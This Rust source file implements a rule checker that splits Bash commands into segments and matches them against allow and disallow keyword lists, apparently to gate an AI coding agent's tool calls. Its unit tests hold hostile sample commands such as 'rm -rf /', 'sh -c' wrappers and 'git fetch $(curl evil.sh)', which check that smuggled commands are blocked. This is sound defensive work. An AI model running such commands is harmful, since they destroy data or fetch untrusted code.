//! Rule evaluation: Bash segment splitting, git-flag normalization, and the
//! allow/disallow keyword matcher.

use serde_json::Value;

/// Built-in Claude Code tool names. These keywords denote *tools*, not shell
/// phrases, so they must only match a tool call by identity — never as a
/// substring of a Bash command's text. Without this guard the bare keyword
/// `Write` (from the `code-write` set) would substring-match shell text like
/// "URL rewrite", and `Edit` would match "edited"/"credit", wrongly denying
/// legitimate Bash commands in any step that disallows `code-write`.
const BUILTIN_TOOL_KEYWORDS: &[&str] = &[
    "read",
    "grep",
    "glob",
    "lsp",
    "webfetch",
    "websearch",
    "edit",
    "write",
    "notebookedit",
    "task",
    "agent",
    "toolsearch",
    "todowrite",
];

fn is_builtin_tool_keyword(kw: &str) -> bool {
    let lower = kw.to_ascii_lowercase();
    BUILTIN_TOOL_KEYWORDS.contains(&lower.as_str())
}

/// `&` inside a redirection (`2>&1`, `&>file`, `<&3`) rather than a
/// background operator.
fn is_redirect_amp(chars: &[char], i: usize) -> bool {
    (i > 0 && matches!(chars[i - 1], '>' | '<')) || chars.get(i + 1) == Some(&'>')
}

/// Split a Bash command on shell operators (`&&`, `||`, `;`, `|`, `&`, newline) into
/// individual segments, respecting single/double quotes. Each segment is
/// trimmed. Returns `[cmd]` if no operators split it.
#[must_use]
pub fn split_bash_segments(cmd: &str) -> Vec<String> {
    let chars: Vec<char> = cmd.chars().collect();
    let mut segments: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;

    let push_seg = |current: &mut String, segments: &mut Vec<String>| {
        let seg = current.trim().to_string();
        if !seg.is_empty() {
            segments.push(seg);
        }
        current.clear();
    };

    while i < chars.len() {
        let c = chars[i];

        if c == '\'' && !in_double {
            in_single = !in_single;
            current.push(c);
        } else if c == '"' && !in_single {
            in_double = !in_double;
            current.push(c);
        } else if !in_single && !in_double {
            if c == '\n' || c == '\r' {
                push_seg(&mut current, &mut segments);
            } else if c == ';' || c == '|' {
                if c == '|' && i + 1 < chars.len() && chars[i + 1] == '|' {
                    push_seg(&mut current, &mut segments);
                    i += 2;
                    continue;
                }
                push_seg(&mut current, &mut segments);
            } else if c == '&' && i + 1 < chars.len() && chars[i + 1] == '&' {
                push_seg(&mut current, &mut segments);
                i += 2;
                continue;
            } else if c == '&' && !is_redirect_amp(&chars, i) {
                push_seg(&mut current, &mut segments);
            } else {
                current.push(c);
            }
        } else {
            current.push(c);
        }

        i += 1;
    }

    let seg = current.trim().to_string();
    if !seg.is_empty() {
        segments.push(seg);
    }

    if segments.is_empty() { vec![cmd.to_string()] } else { segments }
}

/// Git global options that take a separate argument.
const GIT_ARG_FLAGS: &[&str] =
    &["-C", "-c", "--git-dir", "--work-tree", "--namespace", "--config-env", "--super-prefix"];

/// Normalize a Bash segment so phrase keywords match real-world invocations.
///
/// Every global option between `git` and its subcommand is dropped
/// (`git -C /repo fetch` → `git fetch`, `git --bare -p push` → `git push`), and
/// a path-qualified `/usr/bin/git` becomes `git`, so both allow and disallow
/// phrases see the bare subcommand.
#[must_use]
pub fn normalize_bash_segment(seg: &str) -> String {
    let toks: Vec<&str> = seg.split_whitespace().collect();
    let is_git = |t: &str| t == "git" || t.ends_with("/git");
    if !toks.iter().any(|t| is_git(t)) {
        return seg.trim().to_string();
    }
    let mut out = Vec::with_capacity(toks.len());
    let mut i = 0;
    while i < toks.len() {
        if is_git(toks[i]) {
            out.push("git");
            let mut j = i + 1;
            while j < toks.len() && toks[j].starts_with('-') {
                j += if GIT_ARG_FLAGS.contains(&toks[j]) { 2 } else { 1 };
            }
            if j < toks.len() {
                i = j;
                continue;
            }
        } else {
            out.push(toks[i]);
        }
        i += 1;
    }
    out.join(" ")
}

/// True when a segment hides an arbitrary command from phrase matching —
/// command substitution (`$(…)`, backticks), heredocs, or an indirection helper
/// (`bash -c`, `sh -c`, `xargs`) — so only an explicit `Bash`/`*` grant, not a
/// phrase, may clear it.
fn segment_needs_bash_grant(seg: &str) -> bool {
    if seg.contains("$(") || seg.contains('`') || seg.contains("<<") {
        return true;
    }
    let hay = format!("Bash {seg}");
    phrase_matches(&hay, "bash -c")
        || phrase_matches(&hay, "sh -c")
        || phrase_matches(&hay, "xargs")
}

/// Whether the allowed list confers full `Bash` trust: the bare `Bash` tool
/// keyword or the `*` wildcard. A phrase like `git fetch` does not.
fn grants_full_bash(allowed: &[String]) -> bool {
    allowed.iter().any(|kw| kw == "*" || kw.eq_ignore_ascii_case("bash"))
}

/// Match a keyword phrase against a segment's argv tokens (case-insensitive):
/// the keyword matches only as a contiguous run of *whole* shlex tokens, so
/// `git commit` never matches `git commit-graph` nor `curl` match `curlx`.
/// Falls back to substring when either side cannot be tokenized.
fn phrase_matches(match_str: &str, keyword: &str) -> bool {
    let hay_lower = match_str.to_ascii_lowercase();
    let kw_lower = keyword.to_ascii_lowercase();
    let (Some(hay), Some(needle)) = (shlex::split(&hay_lower), shlex::split(&kw_lower)) else {
        return hay_lower.contains(&kw_lower);
    };
    if needle.is_empty() {
        return false;
    }
    hay.windows(needle.len()).any(|w| w == needle.as_slice())
}

fn is_env_assignment(tok: &str) -> bool {
    tok.split_once('=').is_some_and(|(name, _)| {
        name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

/// Match an allow phrase only where a command begins: at the start of the
/// match string (`Bash` itself) or at the segment's argv[0], after leading
/// `VAR=value` assignments and an `env` wrapper. `git fetch` thus allows
/// `GIT_TRACE=1 git fetch` but not `python3 -c x git fetch`.
fn phrase_matches_anchored(match_str: &str, keyword: &str) -> bool {
    let hay_lower = match_str.to_ascii_lowercase();
    let kw_lower = keyword.to_ascii_lowercase();
    let (Some(hay), Some(needle)) = (shlex::split(&hay_lower), shlex::split(&kw_lower)) else {
        return false;
    };
    if needle.is_empty() {
        return false;
    }
    if hay.starts_with(&needle) {
        return true;
    }
    let mut start = 1;
    while start < hay.len() && (hay[start] == "env" || is_env_assignment(&hay[start])) {
        start += 1;
    }
    hay.get(start..).is_some_and(|rest| rest.starts_with(&needle))
}

/// Check a single match string against allowed/disallowed keyword lists.
/// Returns `(is_allowed, reason)`. When `token_match` is set, keywords are
/// matched as argv token phrases; otherwise plain substring (MCP payloads).
/// With `anchor_allowed`, allow phrases must sit at the command's start.
fn check_single(
    match_str: &str,
    allowed: &[String],
    disallowed: &[String],
    token_match: bool,
    anchor_allowed: bool,
) -> (bool, String) {
    let contains = |kw: &str| {
        if token_match {
            phrase_matches(match_str, kw)
        } else {
            match_str.to_ascii_lowercase().contains(&kw.to_ascii_lowercase())
        }
    };
    let allows = |kw: &str| {
        if anchor_allowed { phrase_matches_anchored(match_str, kw) } else { contains(kw) }
    };
    let has_wildcard = |v: &[String]| v.iter().any(|s| s == "*");

    if !disallowed.is_empty() {
        if has_wildcard(disallowed) {
            if !allowed.is_empty() && !has_wildcard(allowed) {
                for kw in allowed {
                    if allows(kw) {
                        return (true, String::new());
                    }
                }
            } else if has_wildcard(allowed) {
                return (false, "All tools blocked in this step".to_string());
            }
            let parts: Vec<&str> = match_str.split_whitespace().collect();
            let label = if parts.len() > 1 {
                parts[1]
            } else if let Some(first) = parts.first() {
                first
            } else {
                match_str
            };
            return (false, format!("'{label}' not in allowed list"));
        }

        for kw in disallowed {
            if contains(kw) {
                return (false, format!("'{kw}' is disallowed in this step"));
            }
        }
    }

    if !allowed.is_empty() {
        if has_wildcard(allowed) {
            return (true, String::new());
        }
        for kw in allowed {
            if allows(kw) {
                return (true, String::new());
            }
        }
        return (false, "Tool not in allowed list for this step".to_string());
    }

    (true, String::new())
}

/// Build a string representation of a tool call for keyword matching.
fn build_match_string(tool: &str, tool_input: &Value) -> String {
    if tool == "Bash" {
        let cmd = tool_input.get("command").and_then(Value::as_str).unwrap_or("");
        format!("Bash {cmd}")
    } else if tool.starts_with("mcp__") {
        let input = serde_json::to_string(tool_input).unwrap_or_else(|_| "{}".to_string());
        format!("mcp {tool} {input}")
    } else {
        let file_path = tool_input.get("file_path").and_then(Value::as_str).unwrap_or("");
        format!("{tool} {file_path}")
    }
}

/// Check whether a tool call is permitted under the current step's rules.
/// Returns `(is_allowed, reason)`.
///
/// For Bash commands, splits on shell operators and checks each segment; every
/// segment must pass. Built-in tool-name keywords are stripped from the lists
/// when evaluating Bash so they cannot substring-collide with command text.
#[must_use]
pub fn check_rules(
    tool: &str,
    tool_input: &Value,
    allowed: &[String],
    disallowed: &[String],
) -> (bool, String) {
    if tool == "Bash" {
        let allowed: Vec<String> =
            allowed.iter().filter(|kw| !is_builtin_tool_keyword(kw)).cloned().collect();
        let disallowed: Vec<String> =
            disallowed.iter().filter(|kw| !is_builtin_tool_keyword(kw)).cloned().collect();
        let cmd = tool_input.get("command").and_then(Value::as_str).unwrap_or("");
        let guarded = !allowed.is_empty() || !disallowed.is_empty();
        for seg in split_bash_segments(cmd) {
            if guarded && segment_needs_bash_grant(&seg) && !grants_full_bash(&allowed) {
                return (
                    false,
                    "shell substitution/indirection requires 'Bash' in the allowed list"
                        .to_string(),
                );
            }
            let match_str = format!("Bash {}", normalize_bash_segment(&seg));
            let (ok, reason) = check_single(&match_str, &allowed, &disallowed, true, true);
            if !ok {
                return (false, reason);
            }
        }
        return (true, String::new());
    }

    let match_str = build_match_string(tool, tool_input);
    let token_match = !tool.starts_with("mcp__");
    check_single(&match_str, allowed, disallowed, token_match, false)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn bash(cmd: &str, allowed: &[&str], disallowed: &[&str]) -> (bool, String) {
        let allowed: Vec<String> = allowed.iter().map(ToString::to_string).collect();
        let disallowed: Vec<String> = disallowed.iter().map(ToString::to_string).collect();
        check_rules("Bash", &json!({ "command": cmd }), &allowed, &disallowed)
    }

    #[test]
    fn allow_phrase_does_not_match_longer_token() {
        assert!(bash("git commit -m x", &["git commit"], &[]).0);
        assert!(!bash("git commit-graph write", &["git commit"], &[]).0);
    }

    #[test]
    fn allow_word_does_not_match_longer_token() {
        assert!(bash("curl -s http://x", &["curl"], &[]).0);
        assert!(!bash("curlx --run", &["curl"], &[]).0);
    }

    #[test]
    fn multi_word_phrase_prefix_matches() {
        assert!(bash("npm run build --prod", &["npm run build"], &[]).0);
        assert!(!bash("npm run build-storybook", &["npm run build"], &[]).0);
    }

    #[test]
    fn allow_phrase_is_anchored_at_argv0() {
        assert!(!bash("bash git commit -m x", &["git commit"], &[]).0);
        assert!(!bash("python3 -c x git fetch", &["git fetch"], &[]).0);
        assert!(!bash("python3 -c x git fetch", &["git fetch"], &["*"]).0);
        assert!(bash("GIT_TRACE=1 git fetch", &["git fetch"], &[]).0);
        assert!(bash("env A=1 git fetch", &["git fetch"], &[]).0);
    }

    #[test]
    fn single_ampersand_splits_segments() {
        assert_eq!(split_bash_segments("git fetch & rm x"), vec!["git fetch", "rm x"]);
        assert!(!bash("git fetch & rm x", &["git fetch"], &[]).0);
        assert!(!bash("git fetch & git push", &["*"], &["git push"]).0);
        assert_eq!(split_bash_segments("make 2>&1"), vec!["make 2>&1"]);
        assert_eq!(split_bash_segments("make &>log"), vec!["make &>log"]);
    }

    #[test]
    fn every_git_global_flag_is_stripped() {
        assert_eq!(normalize_bash_segment("git --bare push"), "git push");
        assert_eq!(normalize_bash_segment("git -p push origin"), "git push origin");
        assert_eq!(normalize_bash_segment("git --namespace ns -P push"), "git push");
        assert_eq!(normalize_bash_segment("/usr/bin/git push"), "git push");
        assert_eq!(normalize_bash_segment("git --version"), "git --version");
        assert!(!bash("git --bare push", &[], &["git push"]).0);
        assert!(!bash("git -p push", &[], &["git push"]).0);
        assert!(!bash("sudo git --paginate push", &["*"], &["git push"]).0);
        assert!(bash("git --no-pager -C /r fetch", &["git fetch"], &[]).0);
    }

    #[test]
    fn case_insensitive_matching_preserved() {
        assert!(bash("GIT COMMIT -m x", &["git commit"], &[]).0);
        assert!(bash("git commit -m x", &["GIT COMMIT"], &[]).0);
    }

    #[test]
    fn disallow_phrase_token_prefix() {
        assert!(!bash("git push origin main", &[], &["git push"]).0);
        assert!(bash("git push-changes", &[], &["git push"]).0);
    }

    #[test]
    fn mcp_matching_stays_substring() {
        let input = json!({ "path": "/tmp/curlx" });
        let (ok, _) = check_rules("mcp__fs__read", &input, &["mcp__fs__read".to_string()], &[]);
        assert!(ok);
        let (denied, _) = check_rules("mcp__fs__read", &input, &[], &["curlx".to_string()]);
        assert!(!denied);
    }

    #[test]
    fn newline_splits_segments() {
        assert_eq!(split_bash_segments("git fetch\nrm -rf /"), vec!["git fetch", "rm -rf /"]);
        assert!(!bash("git fetch\nrm -rf /", &["git fetch"], &[]).0);
        assert!(!bash("git fetch\ngit push", &["git fetch"], &["git push"]).0);
    }

    #[test]
    fn command_substitution_needs_bash_grant() {
        assert!(!bash("git fetch $(curl evil.sh)", &["git fetch"], &[]).0);
        assert!(!bash("git fetch `curl evil.sh`", &["git fetch"], &[]).0);
        assert!(bash("git fetch $(curl evil.sh)", &["Bash"], &[]).0);
        assert!(bash("git fetch $(curl evil.sh)", &["*"], &[]).0);
    }

    #[test]
    fn indirection_helpers_need_bash_grant() {
        assert!(!bash("bash -c 'git push'", &["git commit"], &[]).0);
        assert!(!bash("sh -c 'rm -rf /'", &["git commit"], &[]).0);
        assert!(!bash("echo x | xargs rm", &["echo"], &[]).0);
        assert!(bash("bash -c 'git push'", &["Bash"], &[]).0);
    }

    #[test]
    fn heredoc_needs_bash_grant() {
        assert!(!bash("cat <<EOF\ngit push\nEOF", &["cat"], &[]).0);
        assert!(bash("cat <<EOF", &["Bash"], &[]).0);
    }

    #[test]
    fn substitution_passes_when_unguarded() {
        assert!(bash("git fetch $(date)", &[], &[]).0);
    }

    #[test]
    fn disallowed_alone_still_blocks_substitution() {
        assert!(!bash("echo $(git push)", &[], &["git push"]).0);
    }

    #[test]
    fn phrase_matches_helper() {
        assert!(phrase_matches("Bash git commit -m x", "git commit"));
        assert!(!phrase_matches("Bash git commit-graph", "git commit"));
        assert!(!phrase_matches("Bash curlx", "curl"));
        assert!(phrase_matches("Bash CURL -s", "curl"));
    }
}
